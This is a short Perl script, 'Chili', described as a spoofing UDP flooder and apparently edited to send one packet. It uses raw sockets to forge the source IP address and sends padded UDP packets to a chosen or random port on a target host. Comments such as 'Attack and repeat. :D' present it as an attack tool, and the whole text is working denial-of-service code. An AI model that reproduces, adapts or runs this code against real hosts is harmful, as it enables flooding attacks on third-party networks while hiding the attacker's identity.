#!/usr/bin/perl
# Chili - The spoofing UDP flooder
# Use only for stress testing network devices.
# - Redz
# Copyright 2011-9-1 8:00am
# Edited by Orgy for private use to send a single packet.

# Need raw sockets for spoofing purposes
use Net::RawIP;

# Here we parse command line arguments
($src, $dest, $size, $port) = split(/\s+/, "@ARGV");
$opt = @ARGV;

# Check that we have all the arguements.
if($opt < 4) {
  print "Usage: $0 (srcip) (ip) (size) (port)\n";
  print "If port is \'0\', random ports will be hit.\n";
  exit(0);
}

# Packets have to be below 736 otherwise the packets will become fragmented 
# therefore less impact
if($size > 736) {
  print "Packets must be below 736b.\n";
  exit(0);
}

# SO many times kids write crap that does like, "$size = <int>" ... "data => $size".  You actually have 
# to supply data, not just indicate what the size should be.  So, that's what this does.. it pushes "A"'s into the DATA 
# array, so the array is actually the size specified.  
for(1..$size){
  push @{$DATA},"A"
}

# The Beautiful Display
print "+--+\n";
print "Destination: $dest\n";
print "Source: $src\n";
# Is the destination port random, or targeted?
if($port eq "0") {
  print "Port: Random\n";
} else {
  print "Port: $port\n";
}
print "Packet size: $size\n";
print "+--+\n";

# Heres Our Spoof, Throwing Ip's at random. Don't be worried of a few invalids.
$saddr = join(".", map int rand 256, 1 .. 4);
# Choose a random source port
$rsport = int rand(65535);
if($port eq "0") {
$rport = int rand(65535);
} else {
$rport = $port;
}
# Open raw socket
$packet = Net::RawIP->new({  
        ip => {
          saddr => $src,
          daddr => $dest,
          },
        udp => {
          source => $rsport,
          dest => $rport,   
          data => "@{$DATA}",
          },
        });
# Attack and repeat. :D
$packet->send; 